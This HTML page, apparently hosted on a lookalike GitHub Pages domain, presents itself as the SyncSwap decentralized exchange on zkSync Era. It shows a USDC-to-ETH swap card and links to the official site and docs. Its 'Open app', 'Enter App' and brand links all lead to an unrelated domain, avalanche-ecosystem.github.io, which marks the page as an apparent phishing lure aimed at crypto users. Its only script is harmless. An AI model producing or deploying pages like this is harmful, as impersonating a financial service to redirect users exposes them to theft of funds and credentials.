<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SyncSwap</title>
  <meta name="description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
  <link rel="canonical" href="https://syncswap-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F3EF">
  <meta property="og:type" content="website">
  <meta property="og:title" content="SyncSwap">
  <meta property="og:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
  <meta property="og:url" content="https://syncswap-app.github.io/">
  <meta property="og:image" content="https://syncswap-app.github.io/favicon.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SyncSwap">
  <meta name="twitter:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
  <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://syncswap-app.github.io/#website",
        "url": "https://syncswap-app.github.io/",
        "name": "SyncSwap",
        "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era.",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://syncswap-app.github.io/#organization",
        "name": "SyncSwap",
        "url": "https://syncswap.xyz/",
        "logo": "https://syncswap-app.github.io/favicon.png"
      },
      {
        "@type": "WebApplication",
        "@id": "https://syncswap-app.github.io/#app",
        "name": "SyncSwap",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://syncswap-app.github.io/",
        "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era."
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="SyncSwap home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>SyncSwap</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">SyncSwap</a>
      <a href="https://docs.syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
      <a href="https://explorer.zksync.io/" target="_blank" rel="nofollow noopener noreferrer">zkSync Explorer</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <h1>SyncSwap</h1>
    <p class="sub"><strong>SyncSwap</strong> is a decentralized exchange for token swaps on zkSync Era.</p>

    <section class="swap-card" aria-label="Swap route">
      <div class="route">
        <div class="leg">
          <span class="label">Pay on zkSync Era</span>
          <span class="chip">
            <img src="usdc.png" width="32" height="32" alt="USDC">
            <span>USDC</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">Receive on zkSync Era</span>
          <span class="chip">
            <img src="eth.png" width="32" height="32" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="foot">SyncSwap &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
      button.classList.toggle("is-swapped");
    });
  }());
  </script>
</body>
</html>
